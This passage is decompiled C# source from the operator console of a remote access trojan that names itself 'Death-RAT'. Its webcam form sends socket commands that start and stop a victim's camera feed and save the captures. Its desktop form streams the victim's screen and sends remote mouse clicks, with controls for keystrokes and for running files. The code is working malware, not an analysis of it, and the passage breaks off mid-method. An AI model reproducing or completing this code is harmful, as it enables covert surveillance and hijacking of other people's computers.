			Control arg_354_0 = this.ComboBox2;
			size = new Size(146, 21);
			arg_354_0.Size = size;
			this.ComboBox2.TabIndex = 3;
			this.ComboBox1.BackColor = Color.Black;
			this.ComboBox1.Dock = DockStyle.Right;
			this.ComboBox1.FlatStyle = FlatStyle.Flat;
			this.ComboBox1.ForeColor = Color.LightSteelBlue;
			this.ComboBox1.FormattingEnabled = true;
			Control arg_3C5_0 = this.ComboBox1;
			location = new Point(136, 0);
			arg_3C5_0.Location = location;
			this.ComboBox1.Name = "ComboBox1";
			Control arg_3F0_0 = this.ComboBox1;
			size = new Size(121, 21);
			arg_3F0_0.Size = size;
			this.ComboBox1.TabIndex = 2;
			this.Button1.BackColor = Color.Black;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_461_0 = this.Button1;
			location = new Point(3, 3);
			arg_461_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_48C_0 = this.Button1;
			size = new Size(73, 23);
			arg_48C_0.Size = size;
			this.Button1.TabIndex = 0;
			this.Button1.Text = "Start";
			this.Button1.UseVisualStyleBackColor = false;
			this.Panel1.BackColor = Color.Black;
			this.Panel1.BorderStyle = BorderStyle.FixedSingle;
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Controls.Add(this.Button3);
			this.Panel1.Controls.Add(this.ComboBox1);
			this.Panel1.Controls.Add(this.ComboBox3);
			this.Panel1.Controls.Add(this.ComboBox2);
			this.Panel1.Controls.Add(this.CheckBox3);
			this.Panel1.Dock = DockStyle.Bottom;
			Control arg_587_0 = this.Panel1;
			location = new Point(0, 162);
			arg_587_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_5B5_0 = this.Panel1;
			size = new Size(405, 30);
			arg_5B5_0.Size = size;
			this.Panel1.TabIndex = 7;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_5EA_0 = this.ProgressBar1;
			location = new Point(0, 152);
			arg_5EA_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_618_0 = this.ProgressBar1;
			size = new Size(405, 10);
			arg_618_0.Size = size;
			this.ProgressBar1.TabIndex = 104;
			this.PictureBox1.BackColor = Color.Black;
			this.PictureBox1.Dock = DockStyle.Fill;
			Control arg_65B_0 = this.PictureBox1;
			location = new Point(0, 0);
			arg_65B_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_68C_0 = this.PictureBox1;
			size = new Size(405, 152);
			arg_68C_0.Size = size;
			this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox1.TabIndex = 105;
			this.PictureBox1.TabStop = false;
			this.Panel2.BackColor = Color.Black;
			this.Panel2.Dock = DockStyle.Right;
			Control arg_6ED_0 = this.Panel2;
			location = new Point(334, 0);
			arg_6ED_0.Location = location;
			this.Panel2.Name = "Panel2";
			Control arg_71B_0 = this.Panel2;
			size = new Size(71, 152);
			arg_71B_0.Size = size;
			this.Panel2.TabIndex = 106;
			this.Panel3.BackColor = Color.Black;
			this.Panel3.Dock = DockStyle.Left;
			Control arg_75E_0 = this.Panel3;
			location = new Point(0, 0);
			arg_75E_0.Location = location;
			this.Panel3.Name = "Panel3";
			Control arg_78C_0 = this.Panel3;
			size = new Size(77, 152);
			arg_78C_0.Size = size;
			this.Panel3.TabIndex = 107;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(405, 192);
			this.ClientSize = size;
			this.Controls.Add(this.Panel3);
			this.Controls.Add(this.Panel2);
			this.Controls.Add(this.PictureBox1);
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.Panel1);
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Frm_Cam";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Cam";
			this.TransparencyKey = Color.Fuchsia;
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.ResumeLayout(false);
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = Operators.CompareString(this.Button1.Text, "Start", false) == 0;
				if (flag)
				{
					this.Button1.Text = "Stop";
					this.sk.Send(string.Concat(new string[]
					{
						"!",
						sokserver.Y,
						Conversions.ToString(this.ComboBox1.SelectedIndex),
						sokserver.Y,
						this.ComboBox2.Text
					}));
				}
				else
				{
					this.Button1.Text = "Start";
					this.sk.Send("@");
				}
			}
			catch (Exception expr_AF)
			{
				ProjectData.SetProjectError(expr_AF);
				Exception projectError = expr_AF;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void Cam_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				bool cN = this.sk.CN;
				if (cN)
				{
					this.sk.Send("@");
				}
				this.sk.CN = false;
			}
			catch (Exception expr_31)
			{
				ProjectData.SetProjectError(expr_31);
				Exception projectError = expr_31;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void Cam_Load(object sender, EventArgs e)
		{
			this.Timer2.Start();
			try
			{
				this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(this.osk.L)));
				this.Text = this.QQ;
				this.ComboBox2.SelectedIndex = 3;
				this.Timer1.Enabled = true;
				this.folder = this.osk.Folder + "Cam\\";
				bool flag = !Directory.Exists(this.folder);
				if (flag)
				{
					Directory.CreateDirectory(this.folder);
				}
				this.Button1.Text = "Stop";
				this.sk.Send(string.Concat(new string[]
				{
					"!",
					sokserver.Y,
					Conversions.ToString(this.ComboBox1.SelectedIndex),
					sokserver.Y,
					this.ComboBox2.Text
				}));
			}
			catch (Exception expr_F9)
			{
				ProjectData.SetProjectError(expr_F9);
				Exception projectError = expr_F9;
				ProjectData.SetProjectError(projectError);
				this.Close();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox3.Checked;
			if (@checked)
			{
				try
				{
					Process.Start(this.folder);
				}
				catch (Exception expr_1F)
				{
					ProjectData.SetProjectError(expr_1F);
					Exception projectError = expr_1F;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.osk == null | this.sk == null;
				if (flag)
				{
					this.Close();
				}
				else
				{
					flag = (!this.osk.CN | !this.sk.CN);
					if (flag)
					{
						this.Close();
					}
				}
			}
			catch (Exception expr_4D)
			{
				ProjectData.SetProjectError(expr_4D);
				Exception projectError = expr_4D;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void NyX_Theme1_Click(object sender, EventArgs e)
		{
		}

		private void NyX_Button1_Click(object sender, EventArgs e)
		{
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}

		private void CheckBox3_CheckedChanged_1(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox3.Checked;
			if (@checked)
			{
				try
				{
					Process.Start(this.folder);
				}
				catch (Exception expr_1F)
				{
					ProjectData.SetProjectError(expr_1F);
					Exception projectError = expr_1F;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Cap : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("btnSalvar")]
		private Button _btnSalvar;

		[AccessedThroughProperty("CheckBox2")]
		private CheckBox _CheckBox2;

		[AccessedThroughProperty("btnIniciar")]
		private Button _btnIniciar;

		[AccessedThroughProperty("C2")]
		private ComboBox _C2;

		[AccessedThroughProperty("C1")]
		private ComboBox _C1;

		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		[AccessedThroughProperty("C")]
		private NumericUpDown _C;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("WaterFX1")]
		private WaterFX _WaterFX1;

		[AccessedThroughProperty("P1")]
		private PictureBox _P1;

		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer _Timer1;

		[AccessedThroughProperty("Timer3")]
		private System.Windows.Forms.Timer _Timer3;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		private Point point_1;

		private Point point_2;

		public bool IsActive;

		private System.Windows.Forms.Timer _Timer2;

		public Client F;

		private Point op;

		public Size Sz;

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel1_Paint);
				bool flag = this._Panel1 != null;
				if (flag)
				{
					this._Panel1.Paint -= value2;
				}
				this._Panel1 = value;
				flag = (this._Panel1 != null);
				if (flag)
				{
					this._Panel1.Paint += value2;
				}
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button btnSalvar
		{
			[DebuggerNonUserCode]
			get
			{
				return this._btnSalvar;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnSalvar_Click);
				bool flag = this._btnSalvar != null;
				if (flag)
				{
					this._btnSalvar.Click -= value2;
				}
				this._btnSalvar = value;
				flag = (this._btnSalvar != null);
				if (flag)
				{
					this._btnSalvar.Click += value2;
				}
			}
		}

		internal virtual CheckBox CheckBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox2 = value;
			}
		}

		internal virtual Button btnIniciar
		{
			[DebuggerNonUserCode]
			get
			{
				return this._btnIniciar;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnIniciar_Click);
				bool flag = this._btnIniciar != null;
				if (flag)
				{
					this._btnIniciar.Click -= value2;
				}
				this._btnIniciar = value;
				flag = (this._btnIniciar != null);
				if (flag)
				{
					this._btnIniciar.Click += value2;
				}
			}
		}

		internal virtual ComboBox C2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._C2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._C2 = value;
			}
		}

		internal virtual ComboBox C1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._C1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._C1 = value;
			}
		}

		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox3_CheckedChanged);
				bool flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged -= value2;
				}
				this._CheckBox3 = value;
				flag = (this._CheckBox3 != null);
				if (flag)
				{
					this._CheckBox3.CheckedChanged += value2;
				}
			}
		}

		internal virtual NumericUpDown C
		{
			[DebuggerNonUserCode]
			get
			{
				return this._C;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._C = value;
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual WaterFX WaterFX1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._WaterFX1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._WaterFX1 = value;
			}
		}

		internal virtual PictureBox P1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._P1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.P1_MouseMove1);
				EventHandler value3 = new EventHandler(this.P1_MouseLeave);
				EventHandler value4 = new EventHandler(this.P1_MouseEnter);
				bool flag = this._P1 != null;
				if (flag)
				{
					this._P1.MouseMove -= value2;
					this._P1.MouseLeave -= value3;
					this._P1.MouseEnter -= value4;
				}
				this._P1 = value;
				flag = (this._P1 != null);
				if (flag)
				{
					this._P1.MouseMove += value2;
					this._P1.MouseLeave += value3;
					this._P1.MouseEnter += value4;
				}
			}
		}

		internal virtual System.Windows.Forms.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual System.Windows.Forms.Timer Timer3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer3 != null;
				if (flag)
				{
					this._Timer3.Tick -= value2;
				}
				this._Timer3 = value;
				flag = (this._Timer3 != null);
				if (flag)
				{
					this._Timer3.Tick += value2;
				}
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click_1);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox1 = value;
			}
		}

		[DebuggerNonUserCode]
		public Frm_Cap()
		{
			base.Load += new EventHandler(this.Cap_Load);
			Frm_Cap.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Cap.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Cap.__ENCList.Count == Frm_Cap.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Cap.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Cap.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Cap.__ENCList[num] = Frm_Cap.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Cap.__ENCList.RemoveRange(num, Frm_Cap.__ENCList.Count - num);
						Frm_Cap.__ENCList.Capacity = Frm_Cap.__ENCList.Count;
					}
					Frm_Cap.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Cap));
			this.Panel1 = new Panel();
			this.CheckBox1 = new CheckBox();
			this.Button2 = new Button();
			this.C = new NumericUpDown();
			this.CheckBox3 = new CheckBox();
			this.Button1 = new Button();
			this.btnSalvar = new Button();
			this.CheckBox2 = new CheckBox();
			this.btnIniciar = new Button();
			this.C2 = new ComboBox();
			this.C1 = new ComboBox();
			this.ProgressBar1 = new ProgressBar();
			this.Timer1 = new System.Windows.Forms.Timer(this.components);
			this.Timer3 = new System.Windows.Forms.Timer(this.components);
			this.WaterFX1 = new WaterFX();
			this.P1 = new PictureBox();
			this.Panel1.SuspendLayout();
			((ISupportInitialize)this.C).BeginInit();
			this.WaterFX1.SuspendLayout();
			((ISupportInitialize)this.P1).BeginInit();
			this.SuspendLayout();
			this.Panel1.BackColor = Color.Black;
			this.Panel1.BorderStyle = BorderStyle.FixedSingle;
			this.Panel1.Controls.Add(this.CheckBox1);
			this.Panel1.Controls.Add(this.Button2);
			this.Panel1.Controls.Add(this.C);
			this.Panel1.Controls.Add(this.CheckBox3);
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Controls.Add(this.btnSalvar);
			this.Panel1.Controls.Add(this.CheckBox2);
			this.Panel1.Controls.Add(this.btnIniciar);
			this.Panel1.Controls.Add(this.C2);
			this.Panel1.Controls.Add(this.C1);
			this.Panel1.Dock = DockStyle.Top;
			Control arg_241_0 = this.Panel1;
			Point location = new Point(0, 0);
			arg_241_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_26F_0 = this.Panel1;
			Size size = new Size(519, 31);
			arg_26F_0.Size = size;
			this.Panel1.TabIndex = 3;
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.Cursor = Cursors.Hand;
			this.CheckBox1.ForeColor = Color.LightSteelBlue;
			Control arg_2C6_0 = this.CheckBox1;
			location = new Point(179, 0);
			arg_2C6_0.Location = location;
			this.CheckBox1.Name = "CheckBox1";
			Control arg_2F1_0 = this.CheckBox1;
			size = new Size(56, 17);
			arg_2F1_0.Size = size;
			this.CheckBox1.TabIndex = 7;
			this.CheckBox1.Text = " Lines";
			this.CheckBox1.UseVisualStyleBackColor = true;
			this.Button2.Cursor = Cursors.Hand;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_362_0 = this.Button2;
			location = new Point(3, 1);
			arg_362_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_38D_0 = this.Button2;
			size = new Size(61, 21);
			arg_38D_0.Size = size;
			this.Button2.TabIndex = 4;
			this.Button2.Text = "Start";
			this.Button2.UseVisualStyleBackColor = true;
			this.C.BackColor = SystemColors.InfoText;
			this.C.Dock = DockStyle.Right;
			this.C.ForeColor = Color.White;
			Control arg_402_0 = this.C;
			location = new Point(336, 0);
			arg_402_0.Location = location;
			this.C.Name = "C";
			Control arg_42D_0 = this.C;
			size = new Size(43, 22);
			arg_42D_0.Size = size;
			this.C.TabIndex = 6;
			NumericUpDown arg_46F_0 = this.C;
			decimal value = new decimal(new int[]
			{
				50,
				0,
				0,
				0
			});
			arg_46F_0.Value = value;
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.Cursor = Cursors.Hand;
			this.CheckBox3.ForeColor = Color.LightSteelBlue;
			Control arg_4B9_0 = this.CheckBox3;
			location = new Point(294, 1);
			arg_4B9_0.Location = location;
			this.CheckBox3.Name = "CheckBox3";
			Control arg_4E4_0 = this.CheckBox3;
			size = new Size(45, 17);
			arg_4E4_0.Size = size;
			this.CheckBox3.TabIndex = 4;
			this.CheckBox3.Text = "Key";
			this.CheckBox3.UseVisualStyleBackColor = true;
			this.Button1.Cursor = Cursors.Hand;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_556_0 = this.Button1;
			location = new Point(113, 0);
			arg_556_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_581_0 = this.Button1;
			size = new Size(60, 22);
			arg_581_0.Size = size;
			this.Button1.TabIndex = 6;
			this.Button1.Text = "Run File";
			this.Button1.UseVisualStyleBackColor = true;
			this.btnSalvar.Cursor = Cursors.Hand;
			this.btnSalvar.FlatStyle = FlatStyle.Flat;
			this.btnSalvar.ForeColor = Color.LightSteelBlue;
			Control arg_5F3_0 = this.btnSalvar;
			location = new Point(61, 0);
			arg_5F3_0.Location = location;
			this.btnSalvar.Name = "btnSalvar";
			Control arg_61E_0 = this.btnSalvar;
			size = new Size(59, 22);
			arg_61E_0.Size = size;
			this.btnSalvar.TabIndex = 3;
			this.btnSalvar.Text = "Save";
			this.btnSalvar.UseVisualStyleBackColor = true;
			this.CheckBox2.AutoSize = true;
			this.CheckBox2.Cursor = Cursors.Hand;
			this.CheckBox2.ForeColor = Color.LightSteelBlue;
			Control arg_693_0 = this.CheckBox2;
			location = new Point(235, 1);
			arg_693_0.Location = location;
			this.CheckBox2.Name = "CheckBox2";
			Control arg_6BE_0 = this.CheckBox2;
			size = new Size(62, 17);
			arg_6BE_0.Size = size;
			this.CheckBox2.TabIndex = 4;
			this.CheckBox2.Text = "Mouse";
			this.CheckBox2.UseVisualStyleBackColor = true;
			this.btnIniciar.Cursor = Cursors.Hand;
			this.btnIniciar.FlatStyle = FlatStyle.Flat;
			this.btnIniciar.ForeColor = Color.LightSteelBlue;
			Control arg_72F_0 = this.btnIniciar;
			location = new Point(3, 1);
			arg_72F_0.Location = location;
			this.btnIniciar.Name = "btnIniciar";
			Control arg_75A_0 = this.btnIniciar;
			size = new Size(61, 21);
			arg_75A_0.Size = size;
			this.btnIniciar.TabIndex = 2;
			this.btnIniciar.Text = "Start";
			this.btnIniciar.UseVisualStyleBackColor = true;
			this.C2.BackColor = Color.Black;
			this.C2.Dock = DockStyle.Right;
			this.C2.DropDownStyle = ComboBoxStyle.DropDownList;
			this.C2.FlatStyle = FlatStyle.Flat;
			this.C2.ForeColor = Color.White;
			this.C2.FormattingEnabled = true;
			Control arg_7F6_0 = this.C2;
			location = new Point(379, 0);
			arg_7F6_0.Location = location;
			this.C2.Name = "C2";
			Control arg_821_0 = this.C2;
			size = new Size(65, 21);
			arg_821_0.Size = size;
			this.C2.TabIndex = 1;
			this.C1.BackColor = Color.Black;
			this.C1.Dock = DockStyle.Right;
			this.C1.DropDownStyle = ComboBoxStyle.DropDownList;
			this.C1.FlatStyle = FlatStyle.Flat;
			this.C1.ForeColor = Color.White;
			this.C1.FormattingEnabled = true;
			Control arg_89F_0 = this.C1;
			location = new Point(444, 0);
			arg_89F_0.Location = location;
			this.C1.Name = "C1";
			Control arg_8CA_0 = this.C1;
			size = new Size(73, 21);
			arg_8CA_0.Size = size;
			this.C1.TabIndex = 0;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_8FF_0 = this.ProgressBar1;
			location = new Point(0, 280);
			arg_8FF_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_92D_0 = this.ProgressBar1;
			size = new Size(519, 10);
			arg_92D_0.Size = size;
			this.ProgressBar1.TabIndex = 105;
			this.WaterFX1.BackColor = Color.Transparent;
			this.WaterFX1.Controls.Add(this.P1);
			this.WaterFX1.Dock = DockStyle.Fill;
			this.WaterFX1.ImageBitmap = null;
			Control arg_995_0 = this.WaterFX1;
			location = new Point(0, 31);
			arg_995_0.Location = location;
			this.WaterFX1.Name = "WaterFX1";
			this.WaterFX1.Scale = 1;
			Control arg_9D3_0 = this.WaterFX1;
			size = new Size(519, 249);
			arg_9D3_0.Size = size;
			this.WaterFX1.TabIndex = 106;
			this.P1.BackColor = Color.Black;
			this.P1.BackgroundImageLayout = ImageLayout.Stretch;
			this.P1.BorderStyle = BorderStyle.FixedSingle;
			this.P1.Dock = DockStyle.Fill;
			Control arg_A30_0 = this.P1;
			location = new Point(0, 0);
			arg_A30_0.Location = location;
			this.P1.Name = "P1";
			Control arg_A61_0 = this.P1;
			size = new Size(519, 249);
			arg_A61_0.Size = size;
			this.P1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.P1.TabIndex = 3;
			this.P1.TabStop = false;
			SizeF autoScaleDimensions = new SizeF(7f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(519, 290);
			this.ClientSize = size;
			this.Controls.Add(this.WaterFX1);
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.Panel1);
			this.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ForeColor = Color.White;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Frm_Cap";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Desktop";
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			((ISupportInitialize)this.C).EndInit();
			this.WaterFX1.ResumeLayout(false);
			((ISupportInitialize)this.P1).EndInit();
			this.ResumeLayout(false);
		}

		public string BS(byte[] b)
		{
			return Encoding.Default.GetString(b);
		}

		private void Cap_Load(object sender, EventArgs e)
		{
			this.Timer1.Start();
			this.Timer3.Start();
			int num = 0;
			checked
			{
				int num2;
				do
				{
					this.C1.Items.Add(this.QZ(num));
					num++;
					num2 = 13;
				}
				while (num <= num2);
				int num3 = 1;
				do
				{
					this.C2.Items.Add(num3);
					num3++;
					num2 = 10;
				}
				while (num3 <= num2);
				this.P1.Image = new Bitmap(this.Sz.Width, this.Sz.Height);
				this.C1.SelectedIndex = 4;
				this.C2.SelectedIndex = 4;
			}
		}

		private void btnIniciar_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.btnIniciar.Text, "Start", false) == 0;
			if (flag)
			{
				this.F.Send(string.Concat(new string[]
				{
					"Meu@",
					sokserver.Y,
					Conversions.ToString(this.C1.SelectedIndex),
					sokserver.Y,
					this.C2.Text,
					sokserver.Y,
					Conversions.ToString(this.C.Value)
				}));
				this.btnIniciar.Text = "Stop";
			}
			else
			{
				this.btnIniciar.Text = "Start";
			}
		}

		private void btnSalvar_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog
			{
				Title = "Death-RAT",
				Filter = "Images (*.png)|*.png"
			};
			bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.P1.Image.Save(saveFileDialog.FileName, ImageFormat.Png);
			}
		}

		public Array fx(byte[] b, string WRD)
		{
			List<byte[]> list = new List<byte[]>();
			MemoryStream memoryStream = new MemoryStream();
			MemoryStream memoryStream2 = new MemoryStream();
			string[] array = Strings.Split(this.BS(b), WRD, -1, CompareMethod.Binary);
			memoryStream.Write(b, 0, array[0].Length);
			checked
			{
				memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
				list.Add(memoryStream.ToArray());
				list.Add(memoryStream2.ToArray());
				memoryStream.Dispose();
				memoryStream2.Dispose();
				return list.ToArray();
			}
		}

		private void P1_MouseDown(object sender, MouseEventArgs e)
		{
			bool flag = this.CheckBox2.Checked;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round(Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.P1.Width)))), (int)Math.Round(Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.P1.Height))))));
				flag = (e.Button == MouseButtons.Left);
				int value;
				if (flag)
				{
					value = 2;
				}
				flag = (e.Button == MouseButtons.Right);
				if (flag)
				{
					value = 8;
				}
				this.F.Send(string.Concat(new string[]
				{
					"EnviarClickMauser",
					sokserver.Y,
					Conversions.ToString(point.X),
					sokserver.Y,
					Conversions.ToString(point.Y),
					sokserver.Y,
					Conversions.ToString(value)
				}));
			}
		}

		private void P1_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = this.CheckBox2.Checked && Operators.CompareString(this.btnIniciar.Text, "Stop", false) == 0;
			if (flag)
			{
				Point left = checked(new Point((int)Math.Round(Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.P1.Width)))), (int)Math.Round(Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.P1.Height))))));
				flag = (left != this.op);
				if (flag)
				{
					this.op = left;
				}
			}
		}

		private void P1_MouseUp(object sender, MouseEventArgs e)
		{
